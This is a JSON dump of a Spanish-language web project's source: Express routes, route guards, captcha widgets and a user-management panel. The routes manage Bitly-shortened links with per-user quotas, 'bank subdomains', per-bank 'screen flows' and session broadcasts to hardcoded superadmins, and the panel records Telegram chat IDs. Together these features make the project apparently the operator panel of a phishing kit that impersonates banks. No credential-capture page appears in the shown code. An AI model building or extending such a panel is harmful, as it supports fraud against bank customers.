\"Usuario no encontrado\" });\n      }\n\n      const usage = await linkQuotaService.getCurrentUsage(userId);\n      \n      res.json({\n        success: true,\n        quota: {\n          used: usage.count,\n          limit: usage.limit,\n          remaining: usage.remaining,\n          resetsAt: usage.resetsAt\n        }\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo cuota de usuario:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener cuota\" });\n    }\n  });\n\n  // Resetear cuota semanal de links de un usuario (solo superadmin balonx)\n  app.post(\"/api/admin/users/:userId/reset-link-quota\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    // Solo el superadmin balonx puede resetear cuotas\n    if (req.user.username !== 'balonx') {\n      return res.status(403).json({ message: \"Solo el superadministrador puede resetear las cuotas de usuarios\" });\n    }\n\n    try {\n      const userId = parseInt(req.params.userId, 10);\n      \n      // Validar que userId es un n煤mero v谩lido\n      if (isNaN(userId) || userId <= 0) {\n        return res.status(400).json({ message: \"ID de usuario inv谩lido\" });\n      }\n\n      // Verificar que el usuario existe\n      const user = await storage.getUserById(userId);\n      if (!user) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n\n      const result = await linkQuotaService.resetWeeklyUsage(userId);\n      \n      console.log(`[Admin] Cuota de links reseteada para usuario ${userId} (${user.username}) por ${req.user.username}`);\n      \n      res.json({\n        success: true,\n        message: `Cuota reseteada exitosamente para ${user.username}. Puede generar ${result.limit} links adicionales.`,\n        quota: result\n      });\n    } catch (error: any) {\n      console.error(\"Error reseteando cuota de usuario:\", error);\n      res.status(500).json({ message: error.message || \"Error al resetear cuota\" });\n    }\n  });\n\n  // Endpoint de extender link eliminado - los links no expiran por tiempo\n\n  // Cancelar un link (usuarios pueden cancelar sus propios links, admins pueden cancelar cualquiera)\n  app.post(\"/api/links/:id/cancel\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const linkId = parseInt(req.params.id);\n      \n      // Verificar que el usuario sea el due帽o del link o sea admin\n      const link = await db.query.linkTokens.findFirst({\n        where: eq(linkTokens.id, linkId)\n      });\n\n      if (!link) {\n        return res.status(404).json({ message: \"Link no encontrado\" });\n      }\n\n      // Solo el due帽o del link o un admin puede cancelarlo\n      if (link.userId !== req.user.id && req.user.role !== 'admin') {\n        return res.status(403).json({ message: \"No tienes permiso para cancelar este link\" });\n      }\n\n      // Cancelar el link y eliminar de Bitly autom谩ticamente\n      await linkTokenService.cancelLink(linkId);\n\n      console.log(`[Links] Link ${linkId} cancelado por ${req.user.username} (${req.user.role})`);\n\n      res.json({\n        success: true,\n        message: \"Link cancelado y eliminado de Bitly exitosamente\"\n      });\n    } catch (error: any) {\n      console.error(\"Error cancelando link:\", error);\n      res.status(500).json({ message: error.message || \"Error al cancelar link\" });\n    }\n  });\n\n  // Configurar subdominios de bancos (solo admin)\n  app.get(\"/api/bank-subdomains\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const subdomains = await storage.getBankSubdomains();\n      res.json({ success: true, subdomains });\n    } catch (error: any) {\n      console.error(\"Error obteniendo subdominios:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener subdominios\" });\n    }\n  });\n\n  app.post(\"/api/bank-subdomains\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { bankCode, subdomain } = req.body;\n      \n      if (!bankCode || !subdomain) {\n        return res.status(400).json({ message: \"Se requieren bankCode y subdomain\" });\n      }\n\n      await storage.upsertBankSubdomain({ bankCode, subdomain, isActive: true });\n\n      res.json({\n        success: true,\n        message: \"Subdominio configurado exitosamente\"\n      });\n    } catch (error: any) {\n      console.error(\"Error configurando subdominio:\", error);\n      res.status(500).json({ message: error.message || \"Error al configurar subdominio\" });\n    }\n  });\n\n  // Configuraci贸n de flujos de pantallas por banco (solo admin)\n  app.get(\"/api/screen-flows/:bankCode\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { bankCode } = req.params;\n      const flow = await storage.getBankScreenFlow(bankCode);\n      \n      res.json({\n        success: true,\n        flow: flow || null\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo flujo de pantallas:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener flujo\" });\n    }\n  });\n\n  app.put(\"/api/screen-flows/:bankCode\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { bankCode } = req.params;\n      const { flowConfig } = req.body;\n\n      if (!flowConfig || !Array.isArray(flowConfig)) {\n        return res.status(400).json({ message: \"flowConfig debe ser un array\" });\n      }\n\n      await storage.upsertBankScreenFlow({\n        bankCode,\n        flowConfig,\n        isActive: true,\n        createdBy: req.user.id\n      });\n\n      res.json({\n        success: true,\n        message: \"Flujo de pantallas configurado exitosamente\"\n      });\n    } catch (error: any) {\n      console.error(\"Error configurando flujo de pantallas:\", error);\n      res.status(500).json({ message: error.message || \"Error al configurar flujo\" });\n    }\n  });\n\n  // Endpoints para flujos de usuario por banco\n  app.get(\"/api/user-flows/:bankCode\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { bankCode } = req.params;\n      const flow = await storage.getUserBankFlow(req.user.id, bankCode);\n      \n      res.json({\n        success: true,\n        flow: flow || null\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo flujo de usuario:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener flujo\" });\n    }\n  });\n\n  app.get(\"/api/user-flows\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const flows = await storage.getAllUserBankFlows(req.user.id);\n      \n      res.json({\n        success: true,\n        flows\n      });\n    } catch (error: any) {\n      console.error(\"Error obteniendo flujos de usuario:\", error);\n      res.status(500).json({ message: error.message || \"Error al obtener flujos\" });\n    }\n  });\n\n  app.put(\"/api/user-flows/:bankCode\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { bankCode } = req.params;\n      const { flowConfig } = req.body;\n\n      if (!flowConfig || !Array.isArray(flowConfig)) {\n        return res.status(400).json({ message: \"flowConfig debe ser un array\" });\n      }\n\n      await storage.saveUserBankFlow({\n        userId: req.user.id,\n        bankCode,\n        flowConfig,\n        isActive: true\n      });\n\n      res.json({\n        success: true,\n        message: \"Flujo configurado exitosamente\"\n      });\n    } catch (error: any) {\n      console.error(\"Error configurando flujo de usuario:\", error);\n      res.status(500).json({ message: error.message || \"Error al configurar flujo\" });\n    }\n  });\n\n  app.delete(\"/api/user-flows/:bankCode\", async (req, res) => {\n    if (!req.isAuthenticated() || !req.user) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    try {\n      const { bankCode } = req.params;\n      const deleted = await storage.deleteUserBankFlow(req.user.id, bankCode);\n      \n      if (!deleted) {\n        return res.status(404).json({ message: \"Flujo no encontrado\" });\n      }\n\n      res.json({\n        success: true,\n        message: \"Flujo eliminado exitosamente\"\n      });\n    } catch (error: any) {\n      console.error(\"Error eliminando flujo de usuario:\", error);\n      res.status(500).json({ message: error.message || \"Error al eliminar flujo\" });\n    }\n  });\n\n  return httpServer;\n}\n\n// Helper function to broadcast to admin clients, with option to target specific users\nfunction broadcastToAdmins(message: string, targetUsername?: string) {\n  // Intentar parsear el mensaje para logging y extraer informaci贸n\n  try {\n    const parsedMessage = JSON.parse(message);\n    console.log(`[Broadcast] Enviando mensaje de tipo: ${parsedMessage.type}`);\n    \n    // Si el mensaje se refiere a una sesi贸n, intentamos obtener el creador\n    if (parsedMessage.data && parsedMessage.data.createdBy && !targetUsername) {\n      // Usar el creador de la sesi贸n como targetUsername si no se proporcion贸 uno\n      targetUsername = parsedMessage.data.createdBy;\n      console.log(`[Broadcast] Estableciendo targetUsername a ${targetUsername} basado en createdBy`);\n    }\n  } catch (e) {\n    console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);\n  }\n\n  // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y a todos los administradores\n  let sentCount = 0;\n  \n  if (targetUsername) {\n    // Buscar el cliente del usuario objetivo y los administradores\n    const entries = Array.from(adminClients.entries());\n    for (let i = 0; i < entries.length; i++) {\n      const [username, client] = entries[i];\n      \n      // Consideramos que cualquier usuario que est谩 conectado como admin debe ser un admin, y tambi茅n env铆amos al usuario que cre贸\n      if ((username === targetUsername || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {\n        client.send(message);\n        sentCount++;\n        console.log(`[Broadcast] Mensaje enviado espec铆ficamente a ${username}`);\n      }\n    }\n  } else {\n    // Comportamiento original: broadcast a todos los administradores conectados\n    const entries = Array.from(adminClients.entries());\n    for (let i = 0; i < entries.length; i++) {\n      const [username, client] = entries[i];\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(message);\n        sentCount++;\n      }\n    }\n  }\n  \n  console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);\n}","size_bytes":188539},"client/src/components/ProtectedRoute.tsx":{"content":"import { useAuth } from \"@/hooks/use-auth\";\nimport { Loader2 } from \"lucide-react\";\nimport { Redirect, Route } from \"wouter\";\n\ninterface ProtectedRouteProps {\n  path: string;\n  component: React.ComponentType;\n  adminOnly?: boolean;\n  superAdminOnly?: boolean; // Solo para el usuario balonx (superadmin)\n}\n\nexport function ProtectedRoute({\n  path,\n  component: Component,\n  adminOnly = false,\n  superAdminOnly = false,\n}: ProtectedRouteProps) {\n  const { user, isLoading, isAdmin } = useAuth();\n  \n  // Comprobar si el usuario es el superadministrador (balonx)\n  const isSuperAdmin = user?.username === 'balonx' && user?.role === 'admin';\n\n  return (\n    <Route path={path}>\n      {() => {\n        if (isLoading) {\n          return (\n            <div className=\"flex items-center justify-center min-h-screen\">\n              <Loader2 className=\"h-8 w-8 animate-spin text-primary\" />\n            </div>\n          );\n        }\n\n        if (!user) {\n          return <Redirect to=\"/auth\" />;\n        }\n\n        // Verificar permisos de administrador general\n        if (adminOnly && !isAdmin) {\n          return (\n            <div className=\"flex flex-col items-center justify-center min-h-screen space-y-4\">\n              <h1 className=\"text-2xl font-bold text-red-500\">Acceso denegado</h1>\n              <p className=\"text-gray-600\">No tienes permisos de administrador para acceder a esta p谩gina.</p>\n            </div>\n          );\n        }\n        \n        // Verificar si la ruta es solo para super administrador (balonx)\n        if (superAdminOnly && !isSuperAdmin) {\n          return (\n            <div className=\"flex flex-col items-center justify-center min-h-screen space-y-4\">\n              <h1 className=\"text-2xl font-bold text-red-500\">Acceso denegado</h1>\n              <p className=\"text-gray-600\">Esta secci贸n es exclusiva para el administrador principal.</p>\n            </div>\n          );\n        }\n\n        return <Component />;\n      }}\n    </Route>\n  );\n}","size_bytes":1977},"client/src/components/Captcha.tsx":{"content":"import React, { useState, useEffect, useRef } from 'react';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { Card, CardContent } from '@/components/ui/card';\nimport { RefreshCw, Shield } from 'lucide-react';\n\ninterface CaptchaProps {\n  onVerify: (isValid: boolean) => void;\n  disabled?: boolean;\n}\n\nexport function Captcha({ onVerify, disabled = false }: CaptchaProps) {\n  const canvasRef = useRef<HTMLCanvasElement>(null);\n  const [captchaText, setCaptchaText] = useState('');\n  const [userInput, setUserInput] = useState('');\n  const [isVerified, setIsVerified] = useState(false);\n  \n  // Generar texto aleatorio para captcha\n  const generateCaptchaText = (): string => {\n    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    let result = '';\n    for (let i = 0; i < 6; i++) {\n      result += chars.charAt(Math.floor(Math.random() * chars.length));\n    }\n    return result;\n  };\n  \n  // Dibujar captcha en canvas\n  const drawCaptcha = (text: string) => {\n    const canvas = canvasRef.current;\n    if (!canvas) return;\n    \n    const ctx = canvas.getContext('2d');\n    if (!ctx) return;\n    \n    // Limpiar canvas\n    ctx.clearRect(0, 0, canvas.width, canvas.height);\n    \n    // Fondo con ruido\n    for (let i = 0; i < 100; i++) {\n      ctx.beginPath();\n      ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;\n      ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 3, 0, 2 * Math.PI);\n      ctx.fill();\n    }\n    \n    // L铆neas de interferencia\n    for (let i = 0; i < 5; i++) {\n      ctx.beginPath();\n      ctx.strokeStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.3)`;\n      ctx.lineWidth = Math.random() * 2;\n      ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);\n      ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);\n      ctx.stroke();\n    }\n    \n    // Dibujar texto con distorsi贸n\n    ctx.font = 'bold 24px Arial';\n    ctx.textBaseline = 'middle';\n    \n    for (let i = 0; i < text.length; i++) {\n      const char = text[i];\n      const x = 20 + i * 25 + Math.random() * 10 - 5;\n      const y = 25 + Math.random() * 10 - 5;\n      const rotation = (Math.random() - 0.5) * 0.5;\n      \n      ctx.save();\n      ctx.translate(x, y);\n      ctx.rotate(rotation);\n      ctx.fillStyle = `rgb(${Math.random() * 100}, ${Math.random() * 100}, ${Math.random() * 100})`;\n      ctx.fillText(char, 0, 0);\n      ctx.restore();\n    }\n  };\n  \n  // Regenerar captcha\n  const regenerateCaptcha = () => {\n    const newText = generateCaptchaText();\n    setCaptchaText(newText);\n    setUserInput('');\n    setIsVerified(false);\n    onVerify(false);\n    drawCaptcha(newText);\n  };\n  \n  // Verificar captcha\n  const verifyCaptcha = () => {\n    const isValid = userInput.toUpperCase() === captchaText.toUpperCase();\n    setIsVerified(isValid);\n    onVerify(isValid);\n    \n    if (!isValid) {\n      // Si es incorrecto, generar nuevo captcha\n      setTimeout(() => {\n        regenerateCaptcha();\n      }, 1000);\n    }\n  };\n  \n  // Inicializar captcha\n  useEffect(() => {\n    regenerateCaptcha();\n  }, []);\n  \n  // Verificar autom谩ticamente cuando el usuario termine de escribir\n  useEffect(() => {\n    if (userInput.length === 6) {\n      verifyCaptcha();\n    }\n  }, [userInput]);\n  \n  return (\n    <Card className=\"w-full\">\n      <CardContent className=\"p-4 space-y-4\">\n        <div className=\"flex items-center gap-2 text-sm font-medium\">\n          <Shield className=\"h-4 w-4\" />\n          <span>Verificaci贸n Anti-Bot</span>\n        </div>\n        \n        <div className=\"flex items-center gap-2\">\n          <canvas\n            ref={canvasRef}\n            width={180}\n            height={50}\n            className=\"border border-gray-300 rounded bg-gray-50\"\n          />\n          <Button\n            type=\"button\"\n            variant=\"outline\"\n            size=\"sm\"\n            onClick={regenerateCaptcha}\n            disabled={disabled}\n            className=\"p-2\"\n          >\n            <RefreshCw className=\"h-4 w-4\" />\n          </Button>\n        </div>\n        \n        <div className=\"space-y-2\">\n          <Label htmlFor=\"captcha-input\" className=\"text-sm\">\n            Ingresa el texto que ves en la imagen:\n          </Label>\n          <Input\n            id=\"captcha-input\"\n            type=\"text\"\n            value={userInput}\n            onChange={(e) => setUserInput(e.target.value.toUpperCase())}\n            placeholder=\"Ingresa el c贸digo\"\n            maxLength={6}\n            disabled={disabled || isVerified}\n            className={`${\n              isVerified ? 'border-green-500 bg-green-50' : \n              userInput.length === 6 && !isVerified ? 'border-red-500 bg-red-50' : ''\n            }`}\n          />\n        </div>\n        \n        {isVerified && (\n          <div className=\"text-green-600 text-sm flex items-center gap-1\">\n            <Shield className=\"h-3 w-3\" />\n             Verificaci贸n completada\n          </div>\n        )}\n        \n        {userInput.length === 6 && !isVerified && (\n          <div className=\"text-red-600 text-sm\">\n             C贸digo incorrecto. Generando nuevo c贸digo...\n          </div>\n        )}\n      </CardContent>\n    </Card>\n  );\n}\n\n// Captcha matem谩tico alternativo\nexport function MathCaptcha({ onVerify, disabled = false }: CaptchaProps) {\n  const [problem, setProblem] = useState({ question: '', answer: 0 });\n  const [userInput, setUserInput] = useState('');\n  const [isVerified, setIsVerified] = useState(false);\n  \n  const generateMathProblem = () => {\n    const operations = ['+', '-', '*'];\n    const operation = operations[Math.floor(Math.random() * operations.length)];\n    \n    let num1, num2, answer, question;\n    \n    switch (operation) {\n      case '+':\n        num1 = Math.floor(Math.random() * 50) + 1;\n        num2 = Math.floor(Math.random() * 50) + 1;\n        answer = num1 + num2;\n        question = `${num1} + ${num2} = ?`;\n        break;\n      case '-':\n        num1 = Math.floor(Math.random() * 50) + 20;\n        num2 = Math.floor(Math.random() * (num1 - 1)) + 1;\n        answer = num1 - num2;\n        question = `${num1} - ${num2} = ?`;\n        break;\n      case '*':\n        num1 = Math.floor(Math.random() * 12) + 1;\n        num2 = Math.floor(Math.random() * 12) + 1;\n        answer = num1 * num2;\n        question = `${num1}  ${num2} = ?`;\n        break;\n      default:\n        num1 = 5;\n        num2 = 3;\n        answer = 8;\n        question = '5 + 3 = ?';\n    }\n    \n    return { question, answer };\n  };\n  \n  const regenerateProblem = () => {\n    const newProblem = generateMathProblem();\n    setProblem(newProblem);\n    setUserInput('');\n    setIsVerified(false);\n    onVerify(false);\n  };\n  \n  const verifyAnswer = () => {\n    const isValid = parseInt(userInput) === problem.answer;\n    setIsVerified(isValid);\n    onVerify(isValid);\n    \n    if (!isValid && userInput !== '') {\n      setTimeout(() => {\n        regenerateProblem();\n      }, 1000);\n    }\n  };\n  \n  useEffect(() => {\n    regenerateProblem();\n  }, []);\n  \n  useEffect(() => {\n    if (userInput !== '') {\n      verifyAnswer();\n    }\n  }, [userInput]);\n  \n  return (\n    <Card className=\"w-full\">\n      <CardContent className=\"p-4 space-y-4\">\n        <div className=\"flex items-center gap-2 text-sm font-medium\">\n          <Shield className=\"h-4 w-4\" />\n          <span>Verificaci贸n Matem谩tica</span>\n        </div>\n        \n        <div className=\"text-center p-4 bg-gray-50 rounded-lg\">\n          <div className=\"text-2xl font-bold text-gray-800\">\n            {problem.question}\n          </div>\n        </div>\n        \n        <div className=\"space-y-2\">\n          <Label htmlFor=\"math-input\" className=\"text-sm\">\n            Resuelve la operaci贸n:\n          </Label>\n          <div className=\"flex gap-2\">\n            <Input\n              id=\"math-input\"\n              type=\"number\"\n              value={userInput}\n              onChange={(e) => setUserInput(e.target.value)}\n              placeholder=\"Respuesta\"\n              disabled={disabled || isVerified}\n              className={`${\n                isVerified ? 'border-green-500 bg-green-50' : \n                userInput !== '' && !isVerified ? 'border-red-500 bg-red-50' : ''\n              }`}\n            />\n            <Button\n              type=\"button\"\n              variant=\"outline\"\n              size=\"sm\"\n              onClick={regenerateProblem}\n              disabled={disabled}\n            >\n              <RefreshCw className=\"h-4 w-4\" />\n            </Button>\n          </div>\n        </div>\n        \n        {isVerified && (\n          <div className=\"text-green-600 text-sm flex items-center gap-1\">\n            <Shield className=\"h-3 w-3\" />\n             Respuesta correcta\n          </div>\n        )}\n        \n        {userInput !== '' && !isVerified && (\n          <div className=\"text-red-600 text-sm\">\n             Respuesta incorrecta. Generando nuevo problema...\n          </div>\n        )}\n      </CardContent>\n    </Card>\n  );\n}","size_bytes":9173},"client/src/components/admin/UserManagement.tsx":{"content":"import { useState } from 'react';\nimport { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';\nimport { apiRequest } from '@/lib/queryClient';\nimport { useToast } from '@/hooks/use-toast';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from '@/components/ui/dialog';\nimport { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';\nimport { UserRole } from '@shared/schema';\nimport { User, UserPlus, Lock, AlertTriangle, UserCheck, UserX, Clock, MessageCircle } from 'lucide-react';\n\n// Interfaces\ntype UserData = {\n  id: number;\n  username: string;\n  role: UserRole;\n  lastLogin?: string;\n  active: boolean;\n  allowedBanks?: string;\n  expiresAt?: string; // A帽adimos campo para fecha de expiraci贸n\n};\n\nconst UserManagement = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  const [isCreateModalOpen, setIsCreateModalOpen] = useState<boolean>(false);\n  const [isChatIdModalOpen, setIsChatIdModalOpen] = useState<boolean>(false);\n  const [selectedUserForChatId, setSelectedUserForChatId] = useState<UserData | null>(null);\n  const [chatIdInput, setChatIdInput] = useState<string>('');\n  const [newUser, setNewUser] = useState<{ username: string; password: string; role: UserRole; telegramChatId: string }>({\n    username: '',\n    password: '',\n    role: UserRole.USER,\n    telegramChatId: '',\n  });\n\n  // Formatear fechas para visualizaci贸n\n  const formatDate = (dateString?: string) => {\n    if (!dateString) return 'Nunca';\n    const date = new Date(dateString);\n    return date.toLocaleString('es-ES', {\n      year: 'numeric',\n      month: '2-digit',\n      day: '2-digit',\n      hour: '2-digit',\n      minute: '2-digit',\n    });\n  };\n\n  // Query para obtener usuarios\n  const { data: users = [], isLoading: isLoadingUsers } = useQuery({\n    queryKey: ['/api/users'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/users');\n      const data = await res.json();\n      return data;\n    },\n  });\n\n  // Mutation para crear usuario\n  const createUserMutation = useMutation({\n    mutationFn: async (userData: typeof newUser) => {\n      const res = await apiRequest('POST', '/api/register', userData);\n      return res.json();\n    },\n    onSuccess: () => {\n      setIsCreateModalOpen(false);\n      setNewUser({ username: '', password: '', role: UserRole.USER, telegramChatId: '' });\n      queryClient.invalidateQueries({ queryKey: ['/api/users'] });\n      toast({\n        title: \"Usuario creado\",\n        description: \"El usuario ha sido creado exitosamente\",\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al crear usuario\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Mutation para activar/desactivar usuario\n  const toggleUserStatusMutation = useMutation({\n    mutationFn: async (username: string) => {\n      const res = await apiRequest('POST', `/api/toggle-user-status/${username}`);\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/users'] });\n      toast({\n        title: \"Estado actualizado\",\n        description: \"El estado del usuario ha sido actualizado\",\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error\",\n        description: `No se pudo actualizar el estado: ${error.message}`,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Mutation para configurar Chat ID\n  const configureChatIdMutation = useMutation({\n    mutationFn: async ({ username, telegramChatId }: { username: string; telegramChatId: string }) => {\n      const res = await apiRequest('PUT', `/api/users/${username}/chat-id`, { telegramChatId });\n      return res.json();\n    },\n    onSuccess: (data) => {\n      setIsChatIdModalOpen(false);\n      setSelectedUserForChatId(null);\n      setChatIdInput('');\n      queryClient.invalidateQueries({ queryKey: ['/api/users'] });\n      toast({\n        title: \"Chat ID configurado\",\n        description: `Chat ID configurado exitosamente para ${data.user?.username}`,\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: \"Error al configurar Chat ID\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Manejador de creaci贸n de usuario\n  const handleCreateUser = (e: React.FormEvent) => {\n    e.preventDefault();\n    createUserMutation.mutate(newUser);\n  };\n\n  // Abrir modal para configurar Chat ID\n  const openChatIdModal = (user: UserData) => {\n    setSelectedUserForChatId(user);\n    setChatIdInput('');\n    setIsChatIdModalOpen(true);\n  };\n\n  // Configurar Chat ID\n  const handleConfigureChatId = (e: React.FormEvent) => {\n    e.preventDefault();\n    if (!selectedUserForChatId || !chatIdInput.trim()) return;\n    \n    configureChatIdMutation.mutate({\n      username: selectedUserForChatId.username,\n      telegramChatId: chatIdInput.trim()\n    });\n  };\n\n  return (\n    <div className=\"space-y-4\">\n      <div className=\"flex justify-between items-center\">\n        <div>\n          <h2 className=\"text-xl font-bold text-white\">Gesti贸n de Usuarios</h2>\n          <p className=\"text-sm text-gray-400\">Administra los usuarios del sistema</p>\n        </div>\n        <Button\n          className=\"bg-[#007bff] hover:bg-[#0069d9] text-white\"\n          onClick={() => setIsCreateModalOpen(true)}\n        >\n          <UserPlus className=\"mr-2 h-4 w-4\" />\n          Nuevo Usuario\n        </Button>\n      </div>\n\n      {/* Users Table/Cards based on device */}\n      <div className=\"bg-[#1e1e1e] rounded-lg p-4 overflow-auto\">\n        {isLoadingUsers ? (\n          <div className=\"flex justify-center py-8\">\n            <div className=\"animate-spin rounded-full h-10 w-10 border-t-2 border-b-2 border-[#00aaff]\"></div>\n          </div>\n        ) : (\n          <>\n            {/* Desktop view */}\n            <div className=\"overflow-x-auto hidden md:block\">\n              <Table>\n                <TableHeader>\n                  <TableRow>\n                    <TableHead className=\"hidden sm:table-cell\">ID</TableHead>\n                    <TableHead>Usuario</TableHead>\n                    <TableHead>Rol</TableHead>\n                    <TableHead>ltimo Acceso</TableHead>\n                    <TableHead>Estado</TableHead>\n                    <TableHead>Expira</TableHead>\n                    <TableHead>Acciones</TableHead>\n                  </TableRow>\n                </TableHeader>\n                <TableBody>\n                {users.map((user: UserData) => (\n                  <TableRow key={user.id}>\n                    <TableCell className=\"hidden sm:table-cell\">{user.id}</TableCell>\n                    <TableCell className=\"font-medium flex items-center\">\n                      <User className=\"mr-2 h-4 w-4 text-gray-400\" />\n                      <span className=\"truncate max-w-[120px] md:max-w-full\">{user.username}</span>\n                    </TableCell>\n                    <TableCell>\n                      <span \n                        className={`px-2 py-1 rounded text-xs ${\n                          user.role === UserRole.ADMIN \n                            ? 'bg-purple-900 text-purple-100' \n                            : 'bg-blue-900 text-blue-100'\n                        }`}\n                      >\n                        {user.role}\n                      </span>\n                    </TableCell>\n                    <TableCell>{formatDate(user.lastLogin)}</TableCell>\n                    <TableCell>\n                      <span \n                        className={`px-2 py-1 rounded text-xs ${\n                          user.active \n                            ? 'bg-green-900 text-green-100' \n                            : 'bg-red-900 text-red-100'\n                        }`}\n                      >\n                        {user.active ? 'Activo' : 'Inactivo'}\n                      </span>\n                    </TableCell>\n                    <TableCell>\n                      {user.expiresAt ? (\n                        <span className=\"flex items-center text-xs text-yellow-300\">\n                          <Clock className=\"w-3 h-3 mr-1\" /> \n                          {formatDate(user.expiresAt)}\n                        </span>\n                      ) : (\n                        <span className=\"text-xs text-gray-400\">No expira</span>\n                      )}\n                    </TableCell>\n                    <TableCell>\n                      <div className=\"flex space-x-1\">\n                        <Button\n                          variant=\"ghost\"\n                          size=\"sm\"\n                          onClick={() => toggleUserStatusMutation.mutate(user.username)}\n                          disabled={toggleUserStatusMutation.isPending}\n                          title={user.active ? 'Desactivar usuario' : 'Activar usuario'}\n                          className=\"px-2\"\n                        >\n                          {user.active ? (\n                            <UserX className=\"h-4 w-4 text-red-500\" />\n                          ) : (\n                            <UserCheck className=\"h-4 w-4 text-green-500\" />\n                          )}\n                        </Button>\n                        <Button\n                          variant=\"ghost\"\n                          size=\"sm\"\n                          onClick={() => openChatIdModal(user)}\n                          disabled={configureChatIdMutation.isPending}\n                          title=\"Configurar Chat ID de Telegram\"\n                          className=\"px-2\"\n                        >\n                          <MessageCircle className=\"h-4 w-4 text-blue-500\" />\n                        </Button>\n                      </div>\n                    </TableCell>\n                  </TableRow>\n                ))}\n                {users.length === 0 && (\n                  <TableRow>\n                    <TableCell colSpan={7} className=\"text-center py-4 text-gray-500\">\n                      No hay usuarios registrados\n                    </TableCell>\n                  </TableRow>\n                )}\n                </TableBody>\n              </Table>\n            </div>\n\n            {/* Mobile view - card style */}\n            <div className=\"md:hidden space-y-4\">\n              {users.length === 0 ? (\n                <div className=\"text-center py-6 text-gray-500\">\n                  No hay usuarios registrados\n                </div>\n              ) : (\n                users.map((user: UserData) => (\n                  <div key={user.id} className=\"bg-[#2c2c2c] p-4 rounded-lg\">\n                    <div className=\"flex items-center justify-between mb-3\">\n                      <div className=\"flex items-center\">\n                        <User className=\"mr-2 h-5 w-5 text-gray-400\" />\n                        <span className=\"font-medium text-white\">{user.username}</span>\n                      </div>\n                      <span \n                        className={`px-3 py-1 rounded text-xs font-medium ${\n                          user.role === UserRole.ADMIN \n                            ? 'bg-purple-900 text-purple-100' \n                            : 'bg-blue-900 text-blue-100'\n                        }`}\n                      >\n                        {user.role}\n                      </span>\n                    </div>\n                    \n                    <div className=\"grid grid-cols-2 gap-2 text-sm mb-3\">\n                      <div className=\"text-gray-400\">Estado:</div>\n                      <div>\n                        <span \n                          className={`px-2 py-0.5 rounded text-xs ${\n                            user.active \n                              ? 'bg-green-900 text-green-100' \n                              : 'bg-red-900 text-red-100'\n                          }`}\n                        >\n                          {user.active ? 'Activo' : 'Inactivo'}\n                        </span>\n                      </div>\n                      \n                      <div className=\"text-gray-400\">ltimo acceso:</div>\n                      <div className=\"text-xs\">{formatDate(user.lastLogin)}</div>\n                      \n                      {user.expiresAt && (\n                        <>\n                          <div className=\"text-gray-400\">Expira:</div>\n                          <div className=\"text-xs text-yellow-300 flex items-center\">\n                            <Clock className=\"w-3 h-3 mr-1\" /> \n                            {formatDate(user.expiresAt)}\n                          </div>\n                        </>\n                      )}\n                    </div>\n                    \n                    <div className=\"border-t border-gray-700 pt-3 flex justify-end space-x-2\">\n                      <Button\n                        variant=\"ghost\"\n                        size=\"sm\"\n                        onClick={() => openChatIdModal(user)}\n                        disabled={configureChatIdMutation.isPending}\n                        className=\"px-3 